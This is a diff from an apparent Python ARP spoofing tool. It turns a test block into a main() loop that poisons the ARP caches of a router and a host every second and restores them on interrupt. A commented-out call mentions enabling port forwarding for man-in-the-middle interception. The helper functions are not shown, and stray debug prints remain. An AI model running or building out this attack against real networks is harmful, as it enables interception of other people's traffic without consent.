@@ -56,26 +56,22 @@ def restore(targetIP, hostIP, verbose=True) -> str:
         return ret_str
 
 
-
-# for testing
-sys.stdout = open("output.txt", "w+")
-        
-targetIP = '192.168.0.1'
-hostIP = '192.168.0.63'
-
-#enable_linuxip()
-print(getMacAddr(hostIP))
-
-spoof(targetIP, hostIP,True)
-spoof(hostIP,targetIP,True)
-
-time.sleep(1)
-
-restore(targetIP,hostIP,True)
-restore(hostIP,targetIP,True)
-
-
-
-
+def main():
+   # sys.stdout = open("output.txt", "w+")#prints everything to a file 
+    targetIP = '192.168.0.1'#target and router ip
+    hostIP = '192.168.0.63'
+    print(21)
+    #enable_linuxip() #turns on port forwarding for linux devices 
+    try:
+        while True:
+            print(2)
+            spoof(targetIP, hostIP,True)
+            spoof(hostIP,targetIP,True)
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("exiting")
+        restore(targetIP,hostIP,True)
+        restore(hostIP,targetIP,True)
+main()
 
 
